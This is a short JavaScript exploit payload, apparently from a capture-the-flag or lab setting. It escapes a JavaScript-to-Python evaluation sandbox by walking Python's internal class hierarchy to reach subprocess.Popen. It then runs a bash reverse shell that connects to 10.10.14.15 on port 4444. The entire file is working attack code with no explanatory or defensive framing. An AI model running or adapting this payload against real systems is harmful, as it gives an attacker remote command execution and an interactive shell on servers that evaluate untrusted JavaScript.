let cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.15/4444 0>&1'";

let hacked, bymarve, n11;
let getattr, obj;

// Access Python's internal attributes through JS objects
hacked = Object.getOwnPropertyNames({});
bymarve = hacked.__getattribute__;
n11 = bymarve("__getattribute__");

// Get to Python's base object class
obj = n11("__class__").__base__;
getattr = obj.__getattribute__;

// Recursive function to find subprocess.Popen in Python's class hierarchy
function findpopen(o) {
  let result;
  for (let i in o.__subclasses__()) {
    let item = o.__subclasses__()[i];
    if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
      return item;
    }
    if (item.__name__ != "type" && (result = findpopen(item))) {
      return result;
    }
  }
}

// now we execute 
findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
"OK";
